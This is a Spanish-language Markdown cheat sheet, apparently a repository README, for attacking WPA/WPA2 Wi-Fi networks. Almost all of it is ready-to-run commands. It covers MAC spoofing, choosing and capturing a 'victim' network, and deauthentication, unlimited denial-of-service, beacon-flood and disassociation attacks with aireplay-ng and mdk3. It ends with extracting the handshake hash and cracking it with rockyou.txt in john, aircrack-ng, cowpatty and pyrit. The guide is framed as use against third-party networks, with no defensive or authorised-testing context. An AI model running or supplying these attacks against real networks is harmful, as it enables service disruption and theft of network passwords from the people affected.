# WIFI_Ataques_redes_inalambricas WPA Y WPA2 

<a name="top"></a>
## Tabla de referencia de los contenidos para visualizacion global
 
### Configuraciones Iniciales de la tarjeta de red inalambrica 
* [Chequeo de tarjeta y resolucion de conflictos](#item1)
* [MAC Spoofing](#item2)
* [Resolucion de problemas de visibilidad y servicios WIFI](#item3)
### Analisis del entorno  
* [Ver puntos de acceso cercanos](#item4)
* [Seleccionada la victima vamos a especificar el escaneo para indagar en ella](#item5)
* [Guardar un .cap de la victima seleccionada para posteriormente trabajar sobre el](#item6)
### Tecnicas de Ataque 
* [Explicacion de operadoresusados de aireplay-ng](#item7.0)
* [ATAQUE DE DESAUTENTIFICACION DIRIGIDO](#item7)
* [ATAQUE DE DESAUTENTIFICACION GLOBAL](#item8)
* [ATAQUE DDOS (DENIED OF SERVICE)](#item9)
* [ATAQUE BEACON FLOOD MODE ATTACK](#item10)
* [ATAQUE DISASSOCIATION AMOK MODE ATTACK](#item11)
### VALIDACIONES DE HANDSHAKE
* [VALIDANDO CON PYRiT](#item12)
### TRATAMIENTO DE LA CAPTURA 
* [TRATANDO LA CAPTURA DEL HANDSHAKE](#item13)
* [EXTRACCION DEL HASH EN EL  HANDSHAKE](#item14)
### FUERZA BRUTA AL HASH > CONTRASEÑA
* [CON JOHN THE RIPPER](#item15)
* [FUERZA BRUTA CON AIRCRACK ( La mas Recomendable)](#item16)
* [FUERZA BRUTA CON GEMPMK](#item17)
* [FUERZA BRUTA CON PYRIT](#item18)
* [FUERZA BRUTA CON PYRIT Y PRECOMPUTACION(La mas Rapida)](#item19)

<a name="item1"></a>
### Chequeo de tarjeta y resolucion de conflictos
 
--Chequeamos las tarjetas de red en busca de la tarjeta inalambrica que pondremos en modo monitor:

```    $ ifconfig ```

En este caso se llama WLAN0 por lo que para ponerla en modo monitor seria :

```    $ airmon-ng start wlan0 ```
    
--Si tenemos procesos conflictivos los matamos :

 ```   
    $ airmon check kill
    o
    $ kill -9 y su PID  --- $ kill -9 702
    o
    $ killall nombre1 nombre2 --- $ killall dhcpclient wpa_supplicant
 ```
 
[Subir](#top)
 
<a name="item2"></a>
### MAC Spoofing
 
--Falsear direccion MAC de la tarjeta de red :(Mac Spoofing)

 ```   $ ifconfig wlan0mon down ```

-- Direccion MAC aleatoria de la base de datos de macchanger:

 ```   $macchanger -a wlan0mon 
       $ifconfig wlan0mon up 
 ```
       
-- Direccion MAC escrita a mano por ejemplo buscamos el uid de la nsa y falseamos con el 

```
    $ macchanger -l | grep "NATIONAL SECURITY AGENCY"   Y nos da 00:20:91:xx:XX:xx
    $ macchanger --mac="00:20:91:dc:a4:8e" --- Asi al identificar la mac lo marca como nsa xD
```

--Desfalsear direccion MAC de la tarjeta de red :

```
    $ ifconfig wlan0mon down 
    $ macchanger -p wlan0mon
    $ ifconfig wlan0mon up 
```
 
[Subir](#top)
 
<a name="item3"></a>
### Resolucion de problemas de visibilidad y servicios WIFI
 
--Si tuvieramos problemas con la tarjeta de red :(No conecta con un wifi access)

```
    $ service network-manager restart 
    $ /etc/init.d/networking restart 
```
 --Comprobamos que es capaz de encontrar puntos wifi 

```
    $ iwlist wlan0 scan | grep ESSID -i 
``` 

[Subir](#top)
 
<a name="item4"></a>
### Ver puntos de acceso cercanos

``` $ airodump-ng wlan0mon ``` Despues de un par de minutos crtl+x

  En funcion del tipo de ataque que lancemos necesitaremos que el  BSSID tenga clientes conectados 
   o no pero con esta informacion tendremos una idea del entorno en el que estamos y la actividad que hay en el 
 
[Subir](#top)

<a name="item5"></a>
### Seleccionada la victima vamos a especificar el escaneo para indagar en ella 
   Airodump-ng -canal -PuntoAccesoVictima     interfaz de red nuestra 
   
``` $ airodump-ng -c 1 --bssid XX:XX:XX:B1:F5:XX wlan0mon ```

-- Otra forma seria atraves del nombre de la red victima 
   Airodump-ng -canal -PuntoAccesoVictima  interfaz de red nuestra
    
``` $ airodump-ng -c 1 --essid MovistarE34A wlan0mon ```
 
 
[Subir](#top)
 
<a name="item6"></a>
### Guardar un .cap de la victima seleccionada para posteriormente trabajar sobre el:
 
 Airodump-ng -canal -FicheroDest -PuntoAccesoVictima  interfaz de red nuestra 
 
``` $ airodump-ng -c 1 -w Captura --essid MovistarE34A wlan0mon ```

 
[Subir](#top)

<a name="item7.0"></a>
### Explicacion de operadoresusados de aireplay-ng:
    
    -0 Ataque de desautentificacion
    -1 Ataque de Autentificacion (solo usar en WEP EN WPA Y WPA2 NO SIRVE DE NADA)
    10 numero de paquetes de desautentificacion que enviaremos
    -e ESSID (Ejemplo MovistarE34A )
    -c Mac del cliente conectado que queremos desautenticar 
    wlan0mon Nuestra interfaz de red (obvio xD)
    -h MAC ADDRESS falsa para injectar en un punto de acceso 

[Subir](#top)

<a name="item7"></a>
### ATAQUE DE DESAUTENTIFICACION DIRIGIDO

SINOPSIS: Expulsaremos un cliente conectado a una red , para forzar que conecte de 
        nuevo y conseguir interceptar el Hankshake  
--Procedemos a almacenar datos de la victima en el fichero Captura 

``` $ airodump-ng -c 1 -w Captura --essid MovistarE34A wlan0mon ```

--En otra consola , procedemos a desautenticar al cliente visitar  

``` $ aireplay-ng -0 10 -e MovistarE34A -c MACDELCLIENTE wlan0mon ```

[Subir](#top)

<a name="item8"></a>
### ATAQUE DE DESAUTENTIFICACION GLOBAL

SINOPSIS: Expulsaremos todos los clientes conectados a una red , para forzar que conecten de 
        nuevo y conseguir interceptar el Hankshake  
--Procedemos a almacenar datos de las victimas en el fichero Captura 

``` $ airodump -c 1 -w Captura --essid MovistarE34A -c MacVictima wlan0mon ```

--En otra consola , procedemos a desautenticar a los clientes visitar  

``` $ aireplay-ng -0 10 -e MovistarE34A -c FF:FF:FF:FF:FF:FF wlan0mon ```

[Subir](#top)

<a name="item9"></a>
### ATAQUE DDOS (DENIED OF SERVICE)

SINOPSIS: Expulsaremos todos los clientes conectados a una red ,durante un tiempo ilimitado
        hasta que cerremos el script con crtl+c
--En consola , ponemos el numero de veces que se desautenticara a 0(infinito) y todo el mundo sin conexion  

``` $ aireplay-ng -0 0 -e MovistarE34A -c FF:FF:FF:FF:FF:FF wlan0mon ```

--Otra manera de hacer un DDOS a la red seria( en -a se pone el BSSID del router objetivo :

``` $ mdk3 wlan0mon a -a 00:15:dc:5c:61:2f ```

[Subir](#top)

<a name="item10"></a>
### ATAQUE BEACON FLOOD MODE ATTACK

SINOPSIS: Aqui el objetivo es saturar el espectro de onda (canal de comunicacion del punto
        de acceso creando muchos puntos de acceso en ese mismo canal
        Tenemos dos formas de realizar este ataque en ambas atacaremos al CANAL1:
--Primera, en consola (creara muchos AP Falsos con nombres raros):

``` $ mdk3 wlan0mon b -c 1 ```

--Segunda, en consola(Crearemos a partir de un nombre varios puntos con diferentes numeros):

```
    $ for i in $(seq 1 10 ); do echo "NOTFOUND$i" >> redes.txt; done
    $ mdk3 wlan0mon b -f redes.txt -a -s 1000 -c 1
```

[Subir](#top)

<a name="item11"></a>
### ATAQUE DISASSOCIATION AMOK MODE ATTACK

SINOPSIS: Es otro tipo de ataque de disasociacion dirigido a una lista de clientes de un 
        AP , seria como el global pero eligiendo varios clientes selectivamente 

```  $ nano blacklist   ``` 

Y dentro copiamos los clientes ESTATIONS a desautentificar

```  $  mdk3 wlan0mon d -w blacklist -c 1 ```


[Subir](#top)

## VALIDACIONES DE HANDSHAKE
<a name="item12"></a>
### VALIDANDO CON PYRiT
SINOPSIS: Ya con el handshake obtenido con alguna de las tecnicas anteriores vamos a 
        validarlo para su posterior crackeo 
``` $ pyrit -R Capture-01-.cap analyze ```

## TRATAMIENTO DE LA CAPTURA
<a name="item13"></a>
### TRATANDO LA CAPTURA DEL HANDSHAKE

SINOPSIS: Formaremos el paquete final a partir del Capture-XX.cap con el cual trabajaremos
        para obtener el hash del handshake.(TAMBIEN SE PUEDE HACER DIRECTAMENTE SOBRE EL CAPTURE-01.CAP)
        
``` $ tshark -r Captura-01.cap -R "wlan.fc.type_subtype==0x08 ||  wlan.fc.type_subtype==0x05 || eapol" -2 -w paqfinal -F pcap 2>/dev/null ```

[Subir](#top)

<a name="item14"></a>
### EXTRACCION DEL HASH EN EL  HANDSHAKE

SINOPSIS: YA vamos al turror, sacar el hash para posteriormente romperlo y sacar la 
        tan deseada contraseña xD
--De esta forma sacamos un .hccap a partir del .cap 

``` $ aircrack-ng -J  miCaptura Captura-01.cap ```

--Ahora lo pasamos por hccap2john y conseguimos el fichero del hash por fin (Solo queda romperlo por fuerza bruta)

``` $ hccap2john miCaptura.hccap > miHash ```

[Subir](#top)

## FUERZA BRUTA AL HASH > CONTRASEÑA
<a name="item15"></a>
### CON JOHN THE RIPPER
--Asi pasamos un diccionario para romper la contraseña del fichero miHash

 ``` $  mv miHash /usr/share/wordlists 
    $ cd /usr/share/wordlists
    $ john --wordlists=rockyou.txt miHash 
 ```
 
  UNA VEZ A TERMINADO MUESTRA LA CONTRASEÑA PERO PODRIAMOS VERLA ESCRIBIENDO
  
 ```
    $ john --show miHash
    SINO
    $ john --show miHash --format=wpapsk-pmk
 ```
 
[Subir](#top)

<a name="item16"></a>
### FUERZA BRUTA CON AIRCRACK (La mas Recomendable)

---- NOS AHORARIAMOS VALIDANDO, TRATAMIENTO Y EXTRACCION DEL HASH---- 
  
``` $ aircrack-ng -w rockyou.txt Captura-01.cap ```

[Subir](#top)

<a name="item17"></a>
### FUERZA BRUTA CON GEMPMK

Una forma de ir 100 veces mas rapido que con aircrack-ng es con gempmk pero tiene 
    La contra de primero convertir el diccionario a dic.genpmk
    
``` $ genpmk -f rockyou.txt -d rockyou.genpmk -s MOVISTAR_3E5A ```   (EN -s se pone el nombre del SSID )

Cuando termino de realizar la precomputacion del .dic a .genpmk

``` $ cowpatty -d rockyou.genpmk -r Captura-01.cap -s MOVISTAR_3E5A ```

[Subir](#top)

<a name="item18"></a>
### FUERZA BRUTA CON PYRIT

Una forma de ir 450 veces mas rapido que con aircrack-ng es con gempmk pero tiene 
    La contra de primero convertir el diccionario a dic.genpmk  
    
``` $ genpmk -f rockyou.txt -d rockyou.genpmk -s MOVISTAR_3E5A ```   (EN -s se pone el nombre del SSID )

 Cuando termino de realizar la precomputacion del .dic a .genpmk
 
``` $ pyrit -e   MOVISTAR_3E5A -i rockyou.genpmk -r Captura-01.cap attack_cowpatty ```

[Subir](#top)

<a name="item19"></a>
### FUERZA BRUTA CON PYRIT Y PRECOMPUTACION ( La mas rapida)

LA MAS RAPIDA DE PRECOMPUTACION : 150VECES MAS RAPIDO QUE LA ANTERIOR 
La contra de primero convertir el diccionario a dic.genpmk  
   
``` 
    $ pyrit -i rockyou.txt import_passwords
    $ pyrit -e MOVISTAR_3E5A create_essid
    $ pyrit batch
```

Seguiremos por aqui en un futuro o no xD
